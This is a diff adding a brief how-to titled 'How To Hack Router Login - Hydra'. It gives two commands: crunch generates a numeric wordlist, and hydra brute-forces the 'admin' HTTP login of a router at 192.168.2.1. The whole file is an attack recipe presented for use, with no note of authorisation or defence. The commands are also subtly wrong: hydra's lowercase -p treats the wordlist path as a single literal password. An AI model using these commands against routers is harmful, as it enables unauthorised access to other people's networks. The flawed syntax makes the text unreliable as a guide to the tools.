@@ -1,0 +1,4 @@
+How To Hack Router Login - Hydra
+
+1. crunch 3 4 01234567890 -o /root/Escritorio/passhy.txt 
+2. hydra -s 80 -l admin -p /root/Escritorio/passhy.txt 192.168.2.1 http-get 
